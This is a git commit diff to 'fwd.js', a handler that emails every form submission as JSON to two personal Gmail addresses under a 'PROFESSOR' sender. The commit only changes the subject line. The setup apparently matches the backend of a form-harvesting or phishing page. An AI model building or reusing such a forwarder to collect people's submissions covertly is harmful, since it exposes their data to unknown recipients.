5ff16351c822d9e65645d8a3c80736299a14be80
usmankhan123311 <hip633253@gmail.com>
2026-07-27 18:06:24 +0500

    Update fwd.js

--- fwd.js
+++ fwd.js
@@ -42,7 +42,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <xnncxnxn6@gmail.com>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
-      subject: "IQBAL",
+      subject: "SHAHBAZ",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
